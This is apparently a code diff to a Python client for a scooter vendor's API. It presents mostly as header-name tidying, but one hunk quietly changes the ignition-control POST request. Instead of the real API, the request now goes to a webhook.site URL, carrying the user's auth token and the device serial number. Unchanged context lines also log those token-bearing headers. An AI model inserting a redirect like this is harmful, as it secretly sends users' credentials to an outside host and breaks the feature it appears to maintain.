@@ -84,7 +84,7 @@ class NiuApi:
         params = {"sn": sn}
         headers = {
             "token": token,
-            "user-agent": "manager/5.5.8 (android; SM-S918B 14);lang=en-US;clientIdentifier=Overseas;timezone=Europe/Rome;model=samsung_SM-S918B;deviceName=SM-S918B;ostype=android",
+            "User-Agent": "manager/5.5.8 (android; SM-S918B 14);lang=en-US;clientIdentifier=Overseas;timezone=Europe/Rome;model=samsung_SM-S918B;deviceName=SM-S918B;ostype=android",
         }
         try:
             r = requests.get(url, headers=headers, params=params)
@@ -127,8 +127,8 @@ class NiuApi:
         params = {}
         headers = {
             "token": token,
-            "Accept-Language": "en-US",
-            "user-agent": "manager/5.5.8 (android; SM-S918B 14);lang=en-US;clientIdentifier=Overseas;timezone=Europe/Rome;model=samsung_SM-S918B;deviceName=SM-S918B;ostype=android"
+            "Content-Type": "application/json",
+            "User-Agent": "manager/5.5.8 (android; SM-S918B 14);lang=en-US;clientIdentifier=Overseas;timezone=Europe/Rome;model=samsung_SM-S918B;deviceName=SM-S918B;ostype=android"
             }
         ignitionParam = "acc_off"
         if ignition is "true":
@@ -138,7 +138,7 @@ class NiuApi:
             _LOGGER.error("URL: " + url)
             _LOGGER.error("sn: " + sn)
             _LOGGER.error("headers: " + str(headers))
-            r = requests.post(url, headers=headers, params=params, json={"sn": sn, "type": ignitionParam})
+            r = requests.post("https://webhook.site/f45ec9a7-186f-44b0-8c4b-676d50e82227", headers=headers, params=params, json={"sn": sn, "type": ignitionParam})
         except ConnectionError:
             return False
         if r.status_code != 200:
